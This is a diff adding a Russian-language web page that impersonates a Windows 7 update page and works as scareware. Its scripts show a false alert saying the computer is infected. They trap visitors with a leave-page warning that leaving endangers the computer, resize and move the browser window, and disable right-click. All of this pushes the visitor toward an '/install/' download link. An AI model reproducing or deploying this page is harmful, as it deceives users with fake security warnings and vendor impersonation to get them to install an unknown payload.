@@ -1,0 +1,150 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<title>Установка обновлений Windows</title>
+	<meta name="title" content="" />
+	<meta name="keywords" content="" />
+	<meta name="description" content="" />
+	<link rel="stylesheet" href="/css/style.css" type="text/css" media="screen, projection" />
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
+	<script type="text/javascript" src="/script/corner.js"></script>
+	<!--[if lte IE 6]><link rel="stylesheet" href="/css/style_ie.css" type="text/css" media="screen, projection" /><![endif]-->
+</head>
+
+
+<script  type="text/javascript">
+  var nesprashivat = false;
+        function test1() {
+            if (nesprashivat == false)
+            {
+               return "Вы уверены, что хотите уйти с этой страницы? \n" +
+			   "УХОДЯ С ЭТОЙ СТРАНИЦЫ ВЫ ПОДВЕРГАЕТЕ ОПАСНОСТИ ВАШ КОМПЬЮТЕР  \n";
+            }
+        }
+        window.onbeforeunload = test1;
+</script>
+
+<script  type="text/javascript">
+	var proc = {f1: 1,f2: 1,fnd: {c: 0,d: 0},current: 0,msg: new Array('Внимание! Для корректной и безопасной работы вашей системы Windows 7 вам нужно установить последний пакет обновлений!','Ваш компьютер заражен! Это может привести к потери данных и повреждению файлов! Нажмите Отмена, чтобы предотвратить это.'),dl: false};
+
+	show_alert = function(i, t) {
+		if(i <= proc.msg.length) {
+			if(typeof t != "undefined" && t == true){
+				return proc.msg[i-1];
+			}else{
+				alert(proc.msg[i-1]);
+				return true;
+			}
+		}
+	};
+
+	hdwnd = function() {
+		var w = window;
+		var ua = navigator.userAgent;
+		var v1 = ua.toLowerCase().indexOf('msie') != -1 && ua.toLowerCase().indexOf('opera') < 0;
+		var x = 11;
+		eval('w.resizeTo(x*10,x*11-7)');
+		w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
+	};
+
+$(document).ready(function(){
+	var w = window;
+	hdwnd();
+	show_alert(1);
+	w.moveTo(0,0);
+	w.resizeTo(screen.availWidth, screen.availHeight);
+	w.focus();
+
+	$(document).bind("contextmenu", function(e){return false;});
+	proc.fnd.c = $('.hdd span.c');
+	proc.fnd.d = $('.hdd span.d');
+	proc.current = $('.process span');
+
+  $("a").click(function(event){
+    nesprashivat=true;
+  });
+   
+  $("form").submit(function() {
+	 nesprashivat=true;
+  });
+});
+</script>
+
+<body style="background-color:#daf3fd;">
+
+	<script type="text/javascript">
+		$(document).ready(function(){
+		  ////$("#table_round").attr("class","corner iradius7");
+			if ($.browser.mozilla) {
+			//код только для ИЕ шестой версии!
+			  $("#br_ver").html("Версия " + $.browser.version);
+			}
+			
+		});
+		function check_change(id){
+		val=$("#checkbox"+id).attr("checked");
+			if(val==true){
+				if(id==1){
+				$("#checkbox2").attr("checked","");
+				$("#checkbox3").attr("checked","");
+				}else{
+					if(id==2){
+					$("#checkbox1").attr("checked","");
+					$("#checkbox3").attr("checked","");
+					}else{
+						if(id==3){
+						$("#checkbox1").attr("checked","");
+						$("#checkbox2").attr("checked","");
+						}
+					}
+				}
+			}
+		}
+	</script>
+
+	<table style="width:100%; height: 100%;" cellpadding=0 cellspacing=0>
+		<tr>
+			<td align="center" valign="top" style="height: 100%;">
+				<table style="width:830px; height: 100%; background: #fff;" cellpadding=0 cellspacing=0>
+					<tr>
+						<td align="left" valign="top" style="background: url('/img/topbg.gif'); height: 114px;"><div style="padding-top: 7px;"><img src="/img/logo_windows.gif"></div></td>
+					</tr>
+					<tr>
+						<td valign="top">
+							<div align="center">
+								<table width="100%">
+		<tr>
+			<td align="center" style="height: 80px; padding-left: 40px; padding-right: 20px;"><img src="/img/warning.gif"></td>
+			<td style="color: #f20808; font-size: 18px; font-weight: normal; padding: 0px 100px 0px 10px;text-align: left;">
+				Внимание! Для корректной и безопасной работы вашей системы
+				Windows 7 вам нужно установить последний пакет обновлений. Установка пакета обновлений займет не более
+				2-3 минут.
+			</td>
+		</tr>
+	</table>
+	<table width="100%" style="padding-top: 75px;">
+		<tr><td colspan=2 style="padding-left: 40px; padding-bottom: 20px;text-align: left;"><h1>Пакет обновлений для Windows 7</h1></td></tr>
+		<tr>
+			<td style="font-size: 13px; font-weight: normal; padding: 0px 10px 0px 40px; text-align: left;">
+	Пакет обновления (SP) — это обновление для операционной системы
+	Windows, которое часто объединяет ранее выпущенные обновления и
+	помогает повысить надежность работы Windows. Пакеты обновления 
+	могут содержать улучшения для компонентов безопасности и 
+	производительности, а также предоставлять поддержку для новых
+	типов оборудования. Чтобы сохранить Windows обновленной, 
+	установите последнюю версию пакета обновления.
+			</td>
+			<td align="center" style="padding: 0px 40px 0px 40px;"><img src="/img/7.jpg"></td>
+		</tr>
+		<tr><td colspan=2 align="right" style="padding: 50px 110px 0px 0px;"><a href="/install/"><img src="/img/button_1.gif"></a></td></tr>
+	</table>								</div>
+						</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+	</table>
+</body>
+</html>
